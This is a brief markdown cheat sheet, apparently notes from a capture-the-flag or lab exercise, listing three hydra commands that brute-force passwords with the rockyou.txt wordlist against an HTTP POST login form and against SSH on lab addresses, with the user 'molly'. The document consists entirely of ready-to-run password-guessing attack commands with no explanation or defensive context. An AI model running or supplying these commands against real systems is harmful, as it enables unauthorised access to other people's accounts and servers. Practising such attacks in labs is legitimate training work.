
### Bruteforce a login form
```bash
hydra -l molly -P Downloads/rockyou.txt 10.10.61.210 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
```

### bruteforce SSH

```bash
hydra -l molly -P Downloads/rockyou.txt 10.10.61.210 ssh -V -I

hydra -s 22 -v -q -L ~/Downloads/rockyou.txt -e nsr -t 9 -w 5  127.0.0.1 ssh
```
